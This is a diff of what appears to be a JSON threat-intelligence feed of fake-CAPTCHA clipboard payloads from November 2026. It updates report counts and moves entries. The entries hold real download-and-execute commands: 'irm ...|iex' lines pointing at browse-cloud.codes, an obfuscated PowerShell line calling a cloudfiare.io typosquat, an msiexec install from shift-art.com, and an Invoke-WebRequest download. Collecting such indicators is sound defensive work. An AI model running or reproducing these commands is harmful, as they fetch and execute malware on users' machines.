@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 149,
-    "ReportCount": 149,
-    "FirstSeen": "2026-11-15T20:19:32.973000+00:00",
+    "DistinctPayloadCount": 148,
+    "ReportCount": 148,
+    "FirstSeen": "2026-11-16T03:44:23.448000+00:00",
     "LastSeen": "2026-11-22T12:29:08.297000+00:00",
     "ReportIds": [
-      "cmwia30sw0zni0omlamzgx2of",
       "cmwipz3ac112d0omlvr4l2afs",
       "cmwiqhjjh11sh0oml8cu1s2t0",
       "cmwirn29412nv0oml2psya384",
@@ -271,7 +270,6 @@
       "irm 'browse-cloud.codes/e42bbacd936c1293'|iex;",
       "irm 'browse-cloud.codes/e7debd0a277bf7d4'|iex;",
       "irm 'browse-cloud.codes/ebf9da4f21143943'|iex;",
-      "irm 'browse-cloud.codes/ec20c619766c98f4'|iex;",
       "irm 'browse-cloud.codes/ed9fa08a4fa76c6c'|iex;",
       "irm 'browse-cloud.codes/ede3d0971a4d2345'|iex;",
       "irm 'browse-cloud.codes/edef8da137f56aad'|iex;",
@@ -989,21 +987,6 @@
     ]
   },
   {
-    "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-15T20:17:10.453000+00:00",
-    "LastSeen": "2026-11-15T21:31:07.231000+00:00",
-    "ReportIds": [
-      "cmwi9zysw0zmv0omltdaab4by",
-      "cmwibrmxl0zoa0omlbyzngmgj",
-      "cmwicn28d0ztc0oml2lvkp9eu"
-    ],
-    "PayloadExamples": [
-      "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
-    ]
-  },
-  {
     "Pattern": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare.io/u)\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 3,
@@ -1058,6 +1041,20 @@
     ],
     "PayloadExamples": [
       "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
+    ]
+  },
+  {
+    "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-15T21:06:41.001000+00:00",
+    "LastSeen": "2026-11-15T21:31:07.231000+00:00",
+    "ReportIds": [
+      "cmwibrmxl0zoa0omlbyzngmgj",
+      "cmwicn28d0ztc0oml2lvkp9eu"
+    ],
+    "PayloadExamples": [
+      "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
     ]
   },
   {
